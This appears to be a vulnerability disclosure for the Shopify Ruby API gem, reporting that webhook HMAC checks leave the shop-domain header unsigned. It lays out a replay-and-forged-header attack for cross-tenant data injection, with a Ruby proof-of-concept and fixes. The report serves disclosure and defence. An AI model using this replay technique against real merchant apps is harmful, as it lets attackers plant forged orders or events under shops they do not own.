### Title
Webhook shop-domain header is not covered by the HMAC signature, allowing cross-tenant webhook spoofing - ([File: lib/shopify_api/webhooks/request.rb])

### Summary
`ShopifyAPI::Webhooks::Request` computes/verifies the webhook HMAC over the raw request body only, while the `shop` (tenant) identifier is read from a separate, unsigned HTTP header. The library then hands this unauthenticated `shop` value directly to the app's webhook handler as the tenant identity for the payload. Documented usage (`docs/usage/webhooks.md`) explicitly tells apps to use `data.shop` to route/attribute webhook data (e.g. `perform_later(topic: data.topic, shop_domain: data.shop, webhook: data.body)`), so this field is treated as a trust boundary the library is expected to authenticate — but it does not.

### Finding Description
`ShopifyAPI::Webhooks::Request#to_signable_string` returns only `@raw_body`: [1](#0-0) 

`shop` is derived purely from the `x-shopify-shop-domain` / `shopify-shop-domain` header, which is never part of the signed material: [2](#0-1) 

`Utils::HmacValidator.validate` only checks `HMAC(secret, to_signable_string) == received_hmac`: [3](#0-2) 

`Registry.process` treats a passing HMAC check as sufficient authorization to hand the (unsigned) `shop` header straight to the app's handler as the webhook's tenant identity: [4](#0-3) 

This breaks the intended identity binding: `HMAC-verified-bytes == body`, but `shop` (the value used to attribute/route the payload) is not part of `HMAC-verified-bytes`. The equality that should hold — `(body, shop) bound together` — is not enforced; only `body` is bound.

**Exploit path (no `api_secret_key` or credential theft required):**
1. An attacker installs the app on their own shop (a legitimate, unprivileged action) and lets the app deliver at least one real webhook (e.g. `orders/create`) to the app's public webhook endpoint. This gives the attacker a genuine `(raw_body, hmac)` pair, valid under the app's shared secret, without ever learning the secret itself.
2. The attacker replays that exact `raw_body` + `hmac-sha256` header directly to the app's public webhook URL (webhook endpoints are unauthenticated HTTP(S) POST receivers by design — see `docs/usage/webhooks.md` example controller), but sets `x-shopify-shop-domain` to a victim shop's domain instead of their own.
3. `HmacValidator.validate` passes (only the body is checked), so `Registry.process` calls the handler with `WebhookMetadata.new(..., shop: "victim-shop.myshopify.com", body: <attacker's own order data>, ...)`.
4. Any app that follows the documented pattern of using `data.shop` to look up the victim's session/store and persist or act on `data.body` will ingest attacker-controlled data under the victim's tenant identity — a cross-tenant data-injection primitive.

### Impact Explanation
This crosses a tenant boundary: data nominally scoped to one merchant (the webhook body) can be attributed to an arbitrary other merchant purely by changing an unsigned header, with the HMAC check still passing. Depending on how the host app uses `data.shop` (as most integrations do, per the gem's own documentation), this enables cross-tenant data injection/corruption — e.g. forging orders, product updates, or app-uninstall events against a shop the attacker does not own. This matches the "cross-tenant access" Critical impact category, since a shop's identity used for authorization/attribution of webhook data is not actually authenticated by the mechanism the library provides for that purpose.

### Likelihood Explanation
High. Webhook endpoints are unauthenticated, publicly reachable HTTP(S) endpoints by design (no other transport-level auth). The only gate is `HmacValidator.validate`, which this analysis shows does not cover the `shop` header. No secret material or privileged access is required — only the ability to install the app on any shop (including the attacker's own free/dev store) to harvest a single legitimate `(body, hmac)` pair, plus the ability to send a normal HTTP request with a custom header, which is trivial.

### Recommendation
Bind the shop identity to the signature verification, not just the raw body:
- Have `Request#to_signable_string` (or a new verification step in `HmacValidator`) include the `shop-domain` header value as part of the signed/verified material, or cross-check `shop` against a value independently known to be correct (e.g. compare against the shop tied to the webhook subscription/session that the app already has on file) before dispatching to the handler.
- At minimum, document prominently that `data.shop` is *not* cryptographically authenticated by `Registry.process`, and require/recommend that consuming apps independently verify the shop belongs to an existing installed session before trusting webhook payload attribution.
- Consider validating `shop` with `ShopifyAPI::Utils::ShopValidator.sanitize!` and cross-referencing it against the shop for which the specific `webhook_id`/subscription was registered.

### Proof of Concept
```ruby
require "openssl"
require "base64"

secret = ShopifyAPI::Context.api_secret_key
raw_body = '{"id":1,"note":"legit order from attacker-owned shop"}'

# Step 1: attacker's own shop legitimately delivers this webhook; attacker records
# the (raw_body, hmac) pair exactly as Shopify sent it - no secret is ever exposed.
hmac = Base64.strict_encode64(
  OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret, raw_body)
)

# Step 2: attacker replays the same body+hmac, but swaps only the shop-domain header
headers = {
  "x-shopify-topic" => "orders/create",
  "x-shopify-hmac-sha256" => hmac,
  "x-shopify-shop-domain" => "victim-shop.myshopify.com", # <-- forged, not covered by HMAC
  "x-shopify-webhook-id" => "attacker-chosen-id",
  "x-shopify-api-version" => "2024-01",
}

request = ShopifyAPI::Webhooks::Request.new(raw_body: raw_body, headers: headers)

# Passes: HMAC only verifies raw_body, not the shop header
ShopifyAPI::Utils::HmacValidator.validate(request) # => true

# Registry.process will now call the app's handler with:
#   data.shop == "victim-shop.myshopify.com"
#   data.body == attacker-controlled order payload
ShopifyAPI::Webhooks::Registry.process(request)
```

### Citations

**File:** lib/shopify_api/webhooks/request.rb (L20-23)
```ruby
      sig { returns(String) }
      def shop
        T.cast(shopify_header("shop-domain"), String)
      end
```

**File:** lib/shopify_api/webhooks/request.rb (L35-43)
```ruby
      sig { override.returns(String) }
      def to_signable_string
        @raw_body
      end

      sig { returns(T::Hash[String, T.untyped]) }
      def parsed_body
        JSON.parse(@raw_body)
      end
```

**File:** lib/shopify_api/utils/hmac_validator.rb (L12-31)
```ruby
        sig { params(verifiable_query: VerifiableQuery).returns(T::Boolean) }
        def validate(verifiable_query)
          return false unless verifiable_query.hmac

          result = validate_signature(verifiable_query, Context.api_secret_key)
          if result || Context.old_api_secret_key.nil? || T.must(Context.old_api_secret_key).empty?
            result
          else
            validate_signature(verifiable_query, T.must(Context.old_api_secret_key))
          end
        end

        private

        sig { params(verifiable_query: VerifiableQuery, secret: String).returns(T::Boolean) }
        def validate_signature(verifiable_query, secret)
          received_signature = verifiable_query.hmac
          computed_signature = compute_signature(verifiable_query.to_signable_string, secret)
          OpenSSL.secure_compare(computed_signature, T.must(received_signature))
        end
```

**File:** lib/shopify_api/webhooks/registry.rb (L188-200)
```ruby
        sig { params(request: Request).void }
        def process(request)
          raise Errors::InvalidWebhookError, "Invalid webhook HMAC." unless Utils::HmacValidator.validate(request)

          handler = @registry[request.topic]&.handler

          unless handler
            raise Errors::NoWebhookHandler, "No webhook handler found for topic: #{request.topic}."
          end

          handler.handle(data: WebhookMetadata.new(topic: request.topic, shop: request.shop,
            body: request.parsed_body, api_version: request.api_version, webhook_id: request.webhook_id))
        end
```
